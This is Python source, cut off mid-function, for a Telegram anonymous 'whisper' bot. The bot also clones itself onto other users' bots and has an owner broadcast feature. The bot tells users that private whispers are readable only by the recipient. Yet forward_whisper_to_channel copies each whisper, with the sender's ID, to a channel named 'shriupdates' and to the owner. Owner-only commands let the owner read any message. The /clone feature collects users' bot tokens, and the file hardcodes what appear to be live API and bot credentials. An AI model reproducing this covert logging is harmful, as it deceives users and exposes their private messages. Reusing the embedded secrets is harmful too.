import os
import logging
import re
import asyncio
import json
from datetime import datetime
from flask import Flask
import threading

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Environment variables
API_ID = int(os.getenv('API_ID', '25136703'))
API_HASH = os.getenv('API_HASH', 'accfaf5ecd981c67e481328515c39f89')
BOT_TOKEN = os.getenv('BOT_TOKEN', '8314503581:AAEm5TvIs_-qn23VfOCnfVL1dTRwwDtpi8A')
ADMIN_ID = int(os.getenv('ADMIN_ID', '8385462088'))  # Owner ID
PORT = int(os.environ.get('PORT', 10000))

# Whisper Channel for forwarding
WHISPER_CHANNEL = "shriupdates"  # Channel where whispers will be forwarded

# Import Telethon
try:
    from telethon import TelegramClient, events, Button
    from telethon.errors import SessionPasswordNeededError, UserNotParticipantError, MessageNotModifiedError
except ImportError as e:
    logger.error(f"Telethon import error: {e}")
    raise

# Support channels
SUPPORT_CHANNEL = "shribots"
SUPPORT_GROUP = "idxhelp"

# Initialize bot
try:
    bot = TelegramClient('whisper_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
    logger.info("✅ Bot client initialized successfully")
except Exception as e:
    logger.error(f"❌ Failed to initialize bot: {e}")
    raise

# Storage - OPTIMIZED
messages_db = {}
recent_users = {}
user_cooldown = {}
user_bots = {}
clone_stats = {}
user_recent_targets = {}  # Personal recent targets for each user
all_bot_users = set()     # Track all users who interact with bot

# Broadcast variables
broadcasting = False
broadcast_tasks = {}

# Data files
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)
RECENT_USERS_FILE = os.path.join(DATA_DIR, "recent_users.json")
USER_RECENT_TARGETS_FILE = os.path.join(DATA_DIR, "user_recent_targets.json")
CLONE_STATS_FILE = os.path.join(DATA_DIR, "clone_stats.json")
ALL_USERS_FILE = os.path.join(DATA_DIR, "all_users.json")
FORWARDED_WHISPERS_FILE = os.path.join(DATA_DIR, "forwarded_whispers.json")

def load_data():
    global recent_users, clone_stats, user_recent_targets, all_bot_users
    try:
        if os.path.exists(RECENT_USERS_FILE):
            with open(RECENT_USERS_FILE, 'r', encoding='utf-8') as f:
                recent_users = json.load(f)
            logger.info(f"✅ Loaded {len(recent_users)} recent users")
        
        if os.path.exists(USER_RECENT_TARGETS_FILE):
            with open(USER_RECENT_TARGETS_FILE, 'r', encoding='utf-8') as f:
                user_recent_targets = json.load(f)
            logger.info(f"✅ Loaded user recent targets for {len(user_recent_targets)} users")
        
        if os.path.exists(CLONE_STATS_FILE):
            with open(CLONE_STATS_FILE, 'r', encoding='utf-8') as f:
                clone_stats = json.load(f)
            logger.info(f"✅ Loaded {len(clone_stats)} clone stats")
            
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, 'r', encoding='utf-8') as f:
                all_bot_users = set(json.load(f))
            logger.info(f"✅ Loaded {len(all_bot_users)} total users")
            
    except Exception as e:
        logger.error(f"❌ Error loading data: {e}")
        recent_users = {}
        clone_stats = {}
        user_recent_targets = {}
        all_bot_users = set()

def save_data():
    try:
        with open(RECENT_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(recent_users, f, indent=2, ensure_ascii=False)
        
        with open(USER_RECENT_TARGETS_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_recent_targets, f, indent=2, ensure_ascii=False)
        
        with open(CLONE_STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(clone_stats, f, indent=2, ensure_ascii=False)
            
        with open(ALL_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(list(all_bot_users), f, indent=2, ensure_ascii=False)
            
    except Exception as e:
        logger.error(f"❌ Error saving data: {e}")

# Load data on startup
load_data()

WELCOME_TEXT = """
╔══════════════════════╗
║     🤫 WHISPER BOT    ║
║   ANONYMOUS MESSAGES  ║
╚══════════════════════╝

🔒 Send Anonymous Secret Messages
👤 Only intended recipient can read
🌍 Or send public messages for everyone

**✨ Features:**
• 🤫 Private whispers
• 🌍 Public whispers
• 🚀 Quick inline mode
• 🔄 Recent users memory
• 🤖 Clone your own bot
• 📢 Admin broadcast

Start by typing @Upspbot in any chat!
"""

HELP_TEXT = """
📖 **How to Use Whisper Bot**

**1. Inline Mode:**
   • Type `@Upspbot` in any chat
   • Write your message  
   • Add @username OR user ID at end
   • Send!

**2. Examples:**
   • `@upspbot Hello! @username`
   • `@upspbot I miss you 123456789`
   • `@upspbot Hello everyone!`

**3. Types of Messages:**
   • 🔒 **Private:** Add @username - only they can read
   • 🌍 **Public:** No @username - everyone can read

**4. Commands:**
   • /start - Start bot
   • /help - Show help
   • /clone - Clone your own bot
   • /remove - Remove your cloned bot
   • /broadcast - Paid Promotion (Owner only)

🔒 **Only the mentioned user can read your message!**
🌍 **If no user mentioned, anyone can read!**
"""

def add_user_to_tracking(user_id):
    """Add user to tracking"""
    try:
        all_bot_users.add(user_id)
        # Save periodically to avoid too many disk writes
        if len(all_bot_users) % 10 == 0:
            asyncio.create_task(save_data_async())
    except Exception as e:
        logger.error(f"Error adding user to tracking: {e}")

def add_to_recent_users(user_id, target_user_id, target_username=None, target_first_name=None):
    """Add user to recent users list - OPTIMIZED VERSION"""
    try:
        user_key = str(target_user_id)
        
        # Update global recent users
        recent_users[user_key] = {
            'user_id': target_user_id,
            'username': target_username,
            'first_name': target_first_name,
            'last_used': datetime.now().isoformat()
        }
        
        # Keep only last 20 users
        if len(recent_users) > 20:
            oldest_key = min(recent_users.keys(), key=lambda k: recent_users[k]['last_used'])
            del recent_users[oldest_key]
        
        # Update user's personal recent targets
        user_id_str = str(user_id)
        if user_id_str not in user_recent_targets:
            user_recent_targets[user_id_str] = []
        
        # Remove if already exists
        user_recent_targets[user_id_str] = [t for t in user_recent_targets[user_id_str] 
                                          if t.get('user_id') != target_user_id]
        
        # Add to beginning
        user_recent_targets[user_id_str].insert(0, {
            'user_id': target_user_id,
            'username': target_username,
            'first_name': target_first_name,
            'last_used': datetime.now().isoformat()
        })
        
        # Keep only last 8 per user
        if len(user_recent_targets[user_id_str]) > 8:
            user_recent_targets[user_id_str] = user_recent_targets[user_id_str][:8]
        
    except Exception as e:
        logger.error(f"Error adding to recent users: {e}")

async def save_data_async():
    """Save data asynchronously without blocking"""
    try:
        with open(RECENT_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(recent_users, f, indent=2, ensure_ascii=False)
        
        with open(USER_RECENT_TARGETS_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_recent_targets, f, indent=2, ensure_ascii=False)
        
        with open(CLONE_STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(clone_stats, f, indent=2, ensure_ascii=False)
            
        with open(ALL_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(list(all_bot_users), f, indent=2, ensure_ascii=False)
            
    except Exception as e:
        logger.error(f"Async save error: {e}")

def get_recent_users_buttons(user_id):
    """Get recent users buttons for inline suggestions - SUPER FAST"""
    try:
        user_id_str = str(user_id)
        
        # Use user's personal recent targets first
        user_targets = []
        if user_id_str in user_recent_targets:
            user_targets = user_recent_targets[user_id_str][:6]  # Get first 6
        
        # If user has no personal targets, use global recent
        if not user_targets and recent_users:
            sorted_users = sorted(recent_users.items(), 
                                key=lambda x: x[1].get('last_used', ''), 
                                reverse=True)
            user_targets = [user[1] for user in sorted_users[:4]]
        
        if not user_targets:
            return []
        
        buttons = []
        for user_data in user_targets:
            username = user_data.get('username')
            first_name = user_data.get('first_name', 'User')
            user_id_val = user_data.get('user_id')
            
            if username:
                display_text = f"@{username}"
                query_text = f"@{username}"
            else:
                display_text = f"{first_name}"
                query_text = f"{user_id_val}"
            
            # Truncate long names
            if len(display_text) > 12:
                display_text = display_text[:12] + ".."
            
            buttons.append([Button.switch_inline(
                f"🔒 {display_text}", 
                query=query_text,
                same_peer=True
            )])
        
        return buttons
    except Exception as e:
        logger.error(f"Error getting recent users: {e}")
        return []

def is_cooldown(user_id):
    """Check if user is in cooldown - OPTIMIZED"""
    now = datetime.now().timestamp()
    if user_id in user_cooldown:
        if now - user_cooldown[user_id] < 1:  # Reduced to 1 second
            return True
    user_cooldown[user_id] = now
    return False

# SIMPLIFIED USER DETECTION PATTERNS - NO VALIDATION
USER_PATTERNS = [
    (r'@(\w+)$', 'username_end'),      # @username at end
    (r'(\d+)$', 'userid_end'),         # user ID at end (any digits)
    (r'@(\w+)\s+', 'username_middle'), # @username in middle
    (r'(\d+)\s+', 'userid_middle'),    # user ID in middle
]

async def extract_target_user(text, client):
    """SIMPLIFIED user extraction - NO VALIDATION, WORKS WITH ANY INPUT"""
    original_text = text.strip()
    
    # If no text or just whitespace, return None for public message
    if not original_text or original_text.isspace():
        return None, ""
    
    for pattern, pattern_type in USER_PATTERNS:
        try:
            matches = re.findall(pattern, original_text)
            if matches:
                target_match = matches[0]  # Take first match
                
                # Clean the target
                target_clean = target_match.strip('@')
                
                if pattern_type in ['userid_end', 'userid_middle']:
                    # Handle user ID - NO VALIDATION
                    try:
                        user_obj = await client.get_entity(int(target_clean))
                        if hasattr(user_obj, 'first_name'):
                            # Remove the target from message
                            if pattern_type == 'userid_end':
                                message_text = original_text.replace(target_clean, '').strip()
                            else:
                                message_text = original_text.replace(f"{target_clean} ", '').strip()
                            return user_obj, message_text
                    except:
                        # If user not found, still create message but mark as invalid user
                        fake_user = type('obj', (object,), {
                            'id': int(target_clean) if target_clean.isdigit() else -1,
                            'username': None,
                            'first_name': f"User{target_clean}" 
                        })
                        if pattern_type == 'userid_end':
                            message_text = original_text.replace(target_clean, '').strip()
                        else:
                            message_text = original_text.replace(f"{target_clean} ", '').strip()
                        return fake_user, message_text
                
                else:
                    # Handle username - NO VALIDATION
                    try:
                        user_obj = await client.get_entity(target_clean)
                        if hasattr(user_obj, 'first_name'):
                            # Remove the target from message
                            if pattern_type == 'username_end':
                                message_text = original_text.replace(f"@{target_clean}", '').strip()
                            else:
                                message_text = original_text.replace(f"@{target_clean} ", '').strip()
                            return user_obj, message_text
                    except:
                        # If user not found, still create message but mark as invalid user
                        fake_user = type('obj', (object,), {
                            'id': -1,
                            'username': target_clean,
                            'first_name': f"@{target_clean}" 
                        })
                        if pattern_type == 'username_end':
                            message_text = original_text.replace(f"@{target_clean}", '').strip()
                        else:
                            message_text = original_text.replace(f"@{target_clean} ", '').strip()
                        return fake_user, message_text
        except:
            continue
    
    # If no user pattern found, it's a public message for everyone
    return None, original_text

async def forward_whisper_to_channel(message_id, message_data):
    """Forward whisper message to private channel for owner"""
    try:
        # Get the channel
        channel = await bot.get_entity(f"@{WHISPER_CHANNEL}")
        
        # Create formatted message
        sender_id = message_data['sender_id']
        target_id = message_data['user_id']
        message_text = message_data['msg']
        target_name = message_data['target_name']
        timestamp = message_data['timestamp']
        
        # Format the message
        formatted_msg = f"""
🔒 **WHISPER LOG** 🔒

👤 **From:** {sender_id}
🎯 **To:** {target_name} ({target_id})
📅 **Time:** {timestamp}

💬 **Message:**
{message_text}

📎 **Message ID:** {message_id}
"""
        
        # Send to channel
        await bot.send_message(channel, formatted_msg)
        logger.info(f"✅ Whisper forwarded to channel: {message_id}")
        
        # Also send to owner directly
        try:
            await bot.send_message(ADMIN_ID, formatted_msg)
        except:
            pass
            
    except Exception as e:
        logger.error(f"❌ Error forwarding whisper to channel: {e}")

async def get_owner_whispers(event):
    """Get all whispers for owner to view"""
    try:
        if event.sender_id != ADMIN_ID:
            await event.reply("❌ Owner only command!")
            return
        
        if not messages_db:
            await event.reply("📭 No whispers found yet!")
            return
        
        total_whispers = len(messages_db)
        private_count = sum(1 for m in messages_db.values() if m['user_id'] != -1)
        public_count = sum(1 for m in messages_db.values() if m['user_id'] == -1)
        
        whispers_text = f"""
📋 **ALL WHISPERS - Owner View**

📊 **Statistics:**
• Total Whispers: {total_whispers}
• 🔒 Private: {private_count}
• 🌍 Public: {public_count}

**Recent Whispers:**
"""
        
        # Get recent whispers (last 10)
        recent_items = list(messages_db.items())[-10:]
        
        for msg_id, msg_data in recent_items:
            sender_id = msg_data['sender_id']
            target_id = msg_data['user_id']
            target_name = msg_data['target_name']
            message_preview = msg_data['msg'][:50] + ("..." if len(msg_data['msg']) > 50 else "")
            timestamp = msg_data['timestamp']
            
            if target_id == -1:
                whisper_type = "🌍 PUBLIC"
            else:
                whisper_type = "🔒 PRIVATE"
            
            whispers_text += f"\n{whisper_type} - From: {sender_id} to {target_name}"
            whispers_text += f"\n📝: {message_preview}"
            whispers_text += f"\n🕒: {timestamp}"
            whispers_text += f"\n📎 ID: `{msg_id}`"
            whispers_text += f"\n{'─'*30}"
        
        whispers_text += f"\n\n📤 Use `/readwhisper message_id` to read full message"
        
        await event.reply(whispers_text)
        
    except Exception as e:
        logger.error(f"Error getting owner whispers: {e}")
        await event.reply("❌ Error fetching whispers!")

# ==================== ENHANCED BROADCAST FEATURE ====================
async def send_broadcast_to_user(user_id, message, forward_mode=True):
    """Send broadcast message to a user"""
    try:
        if forward_mode:
            # Forward the message
            await message.forward_to(user_id)
        else:
            # Copy the message
            await message.copy(user_id)
        return True
    except Exception as e:
        logger.error(f"Failed to send broadcast to {user_id}: {e}")
        return False

async def send_broadcast_to_cloned_bots(broadcast_message, forward_mode=True):
    """Send broadcast to all cloned bots so they can forward to their users"""
    try:
        if not user_bots:
            logger.info("No cloned bots found to send broadcast")
            return 0, 0
        
        cloned_bot_success = 0
        cloned_bot_failed = 0
        
        for token, cloned_bot in user_bots.items():
            try:
                # Get cloned bot info
                bot_me = await cloned_bot.get_me()
                
                # Create broadcast command for cloned bot
                broadcast_text = ""
                if forward_mode:
                    # For forward mode
                    if broadcast_message.text:
                        broadcast_text = broadcast_message.text
                    elif broadcast_message.caption:
                        broadcast_text = broadcast_message.caption
                else:
                    # For copy mode
                    if broadcast_message.text:
                        broadcast_text = broadcast_message.text
                    elif broadcast_message.caption:
                        broadcast_text = broadcast_message.caption
                
                # Send special command to cloned bot
                command = f"/broadcast_from_main {'-copy ' if not forward_mode else ''}{broadcast_text[:100]}"
                await cloned_bot.send_message(bot_me.id, command)
                
                cloned_bot_success += 1
                logger.info(f"✅ Broadcast sent to cloned bot: @{bot_me.username}")
                
                await asyncio.sleep(0.5)  # Delay between cloned bots
                
            except Exception as e:
                cloned_bot_failed += 1
                logger.error(f"❌ Failed to send to cloned bot {token[:10]}: {e}")
        
        return cloned_bot_success, cloned_bot_failed
        
    except Exception as e:
        logger.error(f"Error sending to cloned bots: {e}")
        return 0, 0

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_handler(event):
    """Send message to all users + cloned bots - OWNER ONLY"""
    global broadcasting, broadcast_tasks
    
    if event.sender_id != ADMIN_ID:
        await event.reply("❌ Owner only command!")
        return
    
    try:
        if broadcasting:
            await event.reply("⚠️ **Broadcast is already active!**\nUse `/stop_broadcast` to stop first.")
            return
        
        # Check if it's a reply to a message
        if not event.is_reply:
            await event.reply(
                "📢 **Broadcast Usage:**\n\n"
                "Reply to a message with `/broadcast`\n\n"
                "**Options:**\n"
                "• `/broadcast` - Forward message to all users + cloned bots\n"
                "• `/broadcast -copy` - Copy message to all users + cloned bots\n"
                "• `/broadcast -user` - Send to users only (not cloned bots)\n"
                "• `/broadcast -noclone` - Skip cloned bots\n"
                "• `/broadcast -nochat` - Skip group chats\n\n"
                "**Example:** Reply to a message with `/broadcast -copy`\n\n"
                "**Note:** Broadcast will go to:\n"
                "1. 👥 All Main Bot Users\n"
                "2. 🤖 All Cloned Bots (they forward to their users)\n"
                "3. 📢 Support Channels"
            )
            return
        
        # Get the replied message
        message = await event.get_reply_message()
        
        # Check options
        command_text = event.text or ""
        forward_mode = "-copy" not in command_text.lower()
        send_to_users = "-user" in command_text.lower()
        skip_cloned = "-noclone" in command_text.lower()
        skip_chats = "-nochat" in command_text.lower()
        
        # Prepare user list
        user_ids = list(all_bot_users)
        
        if not user_ids and not skip_cloned:
            await event.reply("❌ No users found to broadcast!")
            return
        
        broadcasting = True
        broadcast_tasks = {
            'total': len(user_ids),
            'success': 0,
            'failed': 0,
            'cloned_success': 0,
            'cloned_failed': 0,
            'failed_list': []
        }
        
        # Calculate total targets
        total_targets = len(user_ids)
        if not skip_cloned:
            total_targets += len(user_bots)
        
        # Send starting message
        status_msg = await event.reply(
            f"📢 **Starting Broadcast...**\n\n"
            f"🎯 **Total Targets:** {total_targets}\n"
            f"👥 Main Users: {len(user_ids)}\n"
            f"🤖 Cloned Bots: {0 if skip_cloned else len(user_bots)}\n"
            f"📊 Progress: 0%"
        )
        
        # Forward the message to log channel first
        try:
            await message.forward_to(ADMIN_ID)
            await bot.send_message(
                ADMIN_ID,
                f"📢 **Broadcast Started**\n\n"
                f"👤 From: {event.sender_id}\n"
                f"👤 Name: {event.sender.first_name}\n"
                f"📝 Command: {command_text}\n"
                f"👥 Main Users: {len(user_ids)}\n"
                f"🤖 Cloned Bots: {0 if skip_cloned else len(user_bots)}"
            )
        except:
            pass
        
        # PHASE 1: Send to Cloned Bots (if not skipped)
        cloned_results = (0, 0)
        if not skip_cloned and user_bots:
            await status_msg.edit(
                f"📢 **Broadcasting...**\n\n"
                f"🎯 **Phase 1:** Sending to Cloned Bots\n"
                f"🤖 Bots: 0/{len(user_bots)}\n"
                f"✅ Success: 0\n"
                f"❌ Failed: 0"
            )
            
            cloned_results = await send_broadcast_to_cloned_bots(message, forward_mode)
            broadcast_tasks['cloned_success'] = cloned_results[0]
            broadcast_tasks['cloned_failed'] = cloned_results[1]
        
        # PHASE 2: Send to Main Bot Users
        if user_ids:
            await status_msg.edit(
                f"📢 **Broadcasting...**\n\n"
                f"🎯 **Phase 2:** Sending to Main Users\n"
                f"👥 Users: 0/{len(user_ids)}\n"
                f"✅ Success: 0\n"
                f"❌ Failed: 0\n"
                f"🤖 Cloned Bots: ✅ {broadcast_tasks['cloned_success']} | ❌ {broadcast_tasks['cloned_failed']}"
            )
            
            for i, user_id in enumerate(user_ids):
                if not broadcasting:
                    break
                
                try:
                    success = await send_broadcast_to_user(user_id, message, forward_mode)
                    if success:
                        broadcast_tasks['success'] += 1
                    else:
                        broadcast_tasks['failed'] += 1
                        broadcast_tasks['failed_list'].append(f"{user_id} - Send failed")
                    
                    # Update status every 10 users
                    if (i + 1) % 10 == 0 and broadcasting:
                        progress = ((i + 1) / len(user_ids)) * 100
                        await status_msg.edit(
                            f"📢 **Broadcasting...**\n\n"
                            f"🎯 **Phase 2:** Sending to Main Users\n"
                            f"👥 Users: {i + 1}/{len(user_ids)}\n"
                            f"✅ Success: {broadcast_tasks['success']}\n"
                            f"❌ Failed: {broadcast_tasks['failed']}\n"
                            f"📈 Progress: {progress:.1f}%\n"
                            f"🤖 Cloned Bots: ✅ {broadcast_tasks['cloned_success']} | ❌ {broadcast_tasks['cloned_failed']}"
                        )
                    
                    await asyncio.sleep(0.1)  # Rate limiting
                    
                except Exception as e:
                    broadcast_tasks['failed'] += 1
                    broadcast_tasks['failed_list'].append(f"{user_id} - {str(e)[:50]}")
        
        # Send completion message
        if broadcasting:
            broadcasting = False
            
            # Calculate totals
            total_sent = (broadcast_tasks['success'] + broadcast_tasks['failed'] + 
                         broadcast_tasks['cloned_success'] + broadcast_tasks['cloned_failed'])
            total_success = broadcast_tasks['success'] + broadcast_tasks['cloned_success']
            total_failed = broadcast_tasks['failed'] + broadcast_tasks['cloned_failed']
            
            completion_text = f"""
✅ **Broadcast Completed!**

📊 **Final Results:**

**🤖 Cloned Bots:**
   • ✅ Successful: {broadcast_tasks['cloned_success']} bots
   • ❌ Failed: {broadcast_tasks['cloned_failed']} bots

**👥 Main Bot Users:**
   • ✅ Successful: {broadcast_tasks['success']} users
   • ❌ Failed: {broadcast_tasks['failed']} users

**📈 Summary:**
   • 🎯 Total Targets: {total_targets}
   • ✅ Total Successful: {total_success}
   • ❌ Total Failed: {total_failed}
   • 📊 Success Rate: {(total_success/total_sent*100) if total_sent > 0 else 0:.1f}%
"""
            
            if broadcast_tasks['failed_list']:
                # Save failed list to file
                failed_file = "broadcast_failed.txt"
                with open(failed_file, "w", encoding="utf-8") as f:
                    for failed in broadcast_tasks['failed_list'][:50]:  # Limit to first 50
                        f.write(f"{failed}\n")
                
                completion_text += f"\n📄 Failed users saved to file"
            
            await status_msg.edit(completion_text)
            
            # Send log to owner
            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"📢 **Broadcast Completed**\n\n"
                    f"👤 Executed by: {event.sender.first_name}\n"
                    f"🤖 Cloned Bots: {broadcast_tasks['cloned_success']}✅ | {broadcast_tasks['cloned_failed']}❌\n"
                    f"👥 Main Users: {broadcast_tasks['success']}✅ | {broadcast_tasks['failed']}❌\n"
                    f"🕒 Completed at: {datetime.now().strftime('%H:%M:%S')}"
                )
            except:
                pass
            
            # Clean up failed file if exists
            if broadcast_tasks['failed_list']:
                try:
                    os.remove("broadcast_failed.txt")
                except:
                    pass
        
    except Exception as e:
        logger.error(f"Broadcast error: {e}")
        await event.reply(f"❌ Broadcast error: {str(e)[:100]}")
        broadcasting = False

@bot.on(events.NewMessage(pattern='/stop_broadcast'))
async def stop_broadcast_handler(event):
    """Stop ongoing broadcast - OWNER ONLY"""
    global broadcasting
    
    if event.sender_id != ADMIN_ID:
        await event.reply("❌ Owner only command!")
        return
    
    try:
        if not broadcasting:
            await event.reply("❌ No active broadcast to stop!")
            return
        
        broadcasting = False
        
        total_sent = (broadcast_tasks.get('success', 0) + broadcast_tasks.get('failed', 0) +
                     broadcast_tasks.get('cloned_success', 0) + broadcast_tasks.get('cloned_failed', 0))
        total_success = broadcast_tasks.get('success', 0) + broadcast_tasks.get('cloned_success', 0)
        
        await event.reply(
            f"⏹️ **Broadcast Stopped!**\n\n"
            f"📊 **Partial Results:**\n"
            f"• 🤖 Cloned Bots: {broadcast_tasks.get('cloned_success', 0)}✅ | {broadcast_tasks.get('cloned_failed', 0)}❌\n"
            f"• 👥 Main Users: {broadcast_tasks.get('success', 0)}✅ | {broadcast_tasks.get('failed', 0)}❌\n"
            f"• 📈 Completed: {(total_success/total_sent*100) if total_sent > 0 else 0:.1f}%"
        )
        
        # Send log to owner
        try:
            await bot.send_message(
                ADMIN_ID,
                f"⏹️ **Broadcast Stopped**\n\n"
                f"👤 Stopped by: {event.sender.first_name}\n"
                f"🤖 Cloned Bots: {broadcast_tasks.get('cloned_success', 0)}✅ | {broadcast_tasks.get('cloned_failed', 0)}❌\n"
                f"👥 Main Users: {broadcast_tasks.get('success', 0)}✅ | {broadcast_tasks.get('failed', 0)}❌\n"
                f"🕒 Stopped at: {datetime.now().strftime('%H:%M:%S')}"
            )
        except:
            pass
        
    except Exception as e:
        logger.error(f"Stop broadcast error: {e}")
        await event.reply("❌ Error stopping broadcast!")

# ==================== END ENHANCED BROADCAST FEATURE ====================

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    try:
        logger.info(f"🚀 Start command from user: {event.sender_id}")
        
        # Track user for broadcast
        add_user_to_tracking(event.sender_id)
        
        # All users ko direct access do - NO FORCE JOIN
        if event.sender_id == ADMIN_ID:
            await event.reply(
                WELCOME_TEXT,
                buttons=[
                    [Button.url("📢 Channel", f"https://t.me/{SUPPORT_CHANNEL}")],
                    [Button.url("👥 Support", f"https://t.me/{SUPPORT_GROUP}")],
                    [Button.switch_inline("🚀 Send Whisper", query="", same_peer=True)],
                    [Button.inline("📖 Help", data="help"), Button.inline("🔧 Clone Bot", data="clone_info")],
                    [Button.inline("📊 Stats", data="user_stats"), Button.inline("📋 All Whispers", data="owner_all_whispers")],
                    [Button.inline("📢 Broadcast", data="broadcast_info")]
                ]
            )
        else:
            await event.reply(
                WELCOME_TEXT,
                buttons=[
                    [Button.url("📢 Channel", f"https://t.me/{SUPPORT_CHANNEL}")],
                    [Button.url("👥 Support", f"https://t.me/{SUPPORT_GROUP}")],
                    [Button.switch_inline("🚀 Send Whisper", query="", same_peer=True)],
                    [Button.inline("📖 Help", data="help"), Button.inline("🔧 Clone Bot", data="clone_info")],
                    [Button.inline("📊 Stats", data="user_stats")]
                ]
            )
    except Exception as e:
        logger.error(f"Start error: {e}")
        await event.reply("❌ An error occurred. Please try again.")

@bot.on(events.NewMessage(pattern='/help'))
async def help_handler(event):
    try:
        # Track user for broadcast
        add_user_to_tracking(event.sender_id)
        
        bot_username = (await bot.get_me()).username
        help_text = HELP_TEXT.replace("{bot_username}", bot_username)
        
        await event.reply(
            help_text,
            buttons=[
                [Button.switch_inline("🚀 Try Now", query="", same_peer=True)],
                [Button.inline("🔙 Back", data="back_start")]
            ]
        )
    except Exception as e:
        logger.error(f"Help error: {e}")
        await event.reply("❌ An error occurred. Please try again.")

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_handler(event):
    try:
        # User-specific stats
        user_id_str = str(event.sender_id)
        
        # Get user's recent targets count
        user_targets_count = len(user_recent_targets.get(user_id_str, []))
        
        # Count user's sent whispers
        user_whispers = sum(1 for msg in messages_db.values() if msg['sender_id'] == event.sender_id)
        
        stats_text = f"""
📊 **Your Statistics**

👤 Your User ID: `{event.sender_id}`
📨 Your Recent Targets: {user_targets_count}
💬 Your Sent Whispers: {user_whispers}

**Global Stats:**
👥 Total Users: {len(all_bot_users)}
💬 Total Whispers: {len(messages_db)}
🤖 Cloned Bots: {len(user_bots)}
🕒 Last Active: {datetime.now().strftime("%H:%M")}

🤖 Bot: @{(await bot.get_me()).username}
        """
        
        await event.reply(stats_text)
    except Exception as e:
        logger.error(f"Stats error: {e}")
        await event.reply("❌ Error fetching statistics.")

@bot.on(events.NewMessage(pattern='/allwhispers'))
async def allwhispers_handler(event):
    """Owner can view all whispers"""
    await get_owner_whispers(event)

@bot.on(events.NewMessage(pattern=r'/readwhisper\s+(\S+)'))
async def readwhisper_handler(event):
    """Owner can read any whisper by ID"""
    try:
        if event.sender_id != ADMIN_ID:
            await event.reply("❌ Owner only command!")
            return
        
        msg_id = event.pattern_match.group(1).strip()
        
        if msg_id not in messages_db:
            await event.reply("❌ Whisper not found!")
            return
        
        msg_data = messages_db[msg_id]
        sender_id = msg_data['sender_id']
        target_id = msg_data['user_id']
        message_text = msg_data['msg']
        target_name = msg_data['target_name']
        timestamp = msg_data['timestamp']
        
        if target_id == -1:
            whisper_type = "🌍 PUBLIC"
        else:
            whisper_type = "🔒 PRIVATE"
        
        full_msg = f"""
{whisper_type} **WHISPER DETAILS**

👤 **From User ID:** {sender_id}
🎯 **To:** {target_name} ({target_id})
📅 **Time:** {timestamp}
📎 **Message ID:** `{msg_id}`

💬 **Full Message:**
{message_text}
        """
        
        await event.reply(full_msg)
        
    except Exception as e:
        logger.error(f"Read whisper error: {e}")
        await event.reply("❌ Error reading whisper!")

@bot.on(events.NewMessage(pattern='/clone'))
async def clone_handler(event):
    try:
        # Track user for broadcast
        add_user_to_tracking(event.sender_id)
        
        clone_text = """
🔧 **Clone Your Own Whisper Bot**

🤖 **Create your own bot:**

**Steps:**
1. Go to @BotFather
2. Send /newbot command
3. Choose a name for your bot
4. Choose a username ending with 'bot'
5. Copy the bot token

**Then send:**
`/clone your_bot_token_here`

**Example:**
`/clone 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`

**Commands:**
• `/clone token` - Clone new bot
• `/remove` - Remove your cloned bot

⚠️ **Note:**
• One bot per user only
• Keep your token safe and private
• Your bot will receive broadcasts from main bot
        """
        
        await event.reply(
            clone_text,
            buttons=[
                [Button.url("🤖 Create Bot", "https://t.me/BotFather")],
                [Button.inline("🔙 Back", data="back_start")]
            ]
        )
    except Exception as e:
        logger.error(f"Clone help error: {e}")
        await event.reply("❌ An error occurred. Please try again.")

@bot.on(events.NewMessage(pattern=r'/clone\s+(\S+)'))
async def clone_token_handler(event):
    try:
        user_id = event.sender_id
        token = event.pattern_match.group(1).strip()
        
        # Track user for broadcast
        add_user_to_tracking(user_id)
        
        # Check if user already has a cloned bot
        user_clones = [k for k, v in clone_stats.items() if v.get('owner_id') == user_id]
        if user_clones:
            await event.reply(
                "❌ **You already have a cloned bot!**\n\n"
                "Each user can only clone one bot.\n"
                "Use `/remove` to remove your current bot first.",
                buttons=[[Button.inline("🗑 Remove Bot", data="remove_bot")]]
            )
            return
        
        # Validate token format
        if not re.match(r'^\d+:[A-Za-z0-9_-]+$', token):
            await event.reply(
                "❌ **Invalid Token Format!**\n\n"
                "Please check your bot token.\n"
                "Format should be: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`",
                buttons=[[Button.inline("🔄 Try Again", data="clone_info")]]
            )
            return
        
        # Check if token already used
        if token in clone_stats:
            await event.reply(
                "❌ **This bot is already cloned!**\n\n"
                "Please create a new bot with @BotFather.",
                buttons=[[Button.url("🤖 Create New", "https://t.me/BotFather")]]
            )
            return
        
        creating_msg = await event.reply("🔄 **Creating your bot...**")
        
        # Create user bot instance
        user_bot = TelegramClient(f'user_bot_{user_id}', API_ID, API_HASH)
        await user_bot.start(bot_token=token)
        
        # Get bot info
        bot_me = await user_bot.get_me()
        
        # Store bot instance
        user_bots[token] = user_bot
        
        # Save clone stats
        user_mention = f"[{event.sender.first_name}](tg://user?id={user_id})"
        clone_stats[token] = {
            'owner_id': user_id,
            'username': bot_me.username,
            'first_name': getattr(event.sender, 'first_name', ''),
            'mention': user_mention,
            'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'token_preview': token[:10] + '...'
        }
        
        # Save data in background
        asyncio.create_task(save_data_async())
        
        # Setup handlers for cloned bot
        @user_bot.on(events.NewMessage(pattern='/start'))
        async def user_start(event):
            # Track user for broadcast
            add_user_to_tracking(event.sender_id)
            
            welcome_text_user = WELCOME_TEXT
            
            await event.reply(
                welcome_text_user,
                buttons=[
                    [Button.url("📢 Channel", f"https://t.me/{SUPPORT_CHANNEL}")],
